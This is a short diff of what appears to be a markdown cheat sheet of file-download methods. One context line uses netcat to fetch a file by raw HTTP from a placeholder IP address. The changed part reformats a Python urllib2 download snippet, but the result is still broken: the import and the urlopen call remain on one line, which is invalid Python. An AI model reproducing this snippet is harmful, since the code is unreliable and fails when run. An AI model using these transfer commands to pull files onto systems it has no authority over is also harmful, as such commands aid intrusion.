@@ -62,8 +62,12 @@ echo "GET /file HTTP/1.0" | nc -n ip-addr port > out-file && sed -i '1,7d' out-f
 ```
 
 ### Python
-```bash
-#!/usr/bin/python import urllib2 u = urllib2.urlopen('https://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close()
+```python
+#!/usr/bin/python 
+import urllib2 u = urllib2.urlopen('https://domain/file') 
+localFile = open('local_file', 'w') 
+localFile.write(u.read()) 
+localFile.close()
 ```
 
 ### PHP
